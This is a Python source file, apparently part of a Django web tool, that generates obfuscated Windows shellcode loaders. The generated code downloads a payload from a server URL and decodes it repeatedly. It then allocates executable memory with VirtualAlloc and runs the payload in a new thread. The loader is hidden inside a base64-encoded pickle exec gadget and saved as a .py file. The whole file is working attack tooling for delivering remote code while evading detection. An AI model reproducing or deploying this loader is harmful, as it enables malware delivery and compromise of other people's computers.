#!/usr/bin/python3
# -*- coding:utf-8 -*-
# @Author : yhy

import pickle
import base64
from django.conf import settings


def creat_loader(number, hash_md5):
    shellcode = """
import ctypes,urllib.request,codecs,base64
shellcode = urllib.request.urlopen('http://127.0.0.1:8000/get_code?uuid={}').read()
number = {}

for i in range(int(number)):
    shellcode = base64.b64decode(shellcode)

shellcode = codecs.escape_decode(shellcode)[0]
shellcode = bytearray(shellcode)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr), 
    buf, 
    ctypes.c_int(len(shellcode))
)
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

    """.format(hash_md5, number)

    class A(object):
        def __reduce__(self):
            return(exec,(shellcode,))

    ret = pickle.dumps(A())
    ret_base64 = base64.b64encode(ret)

    output = '''import base64, pickle, ctypes
shellcode = {}
pickle.loads(base64.b64decode(shellcode))
'''.format(ret_base64)

    with open(settings.MEDIA_ROOT + '/' + hash_md5 + '.py', 'w') as f:
        f.write(output)
        f.close()


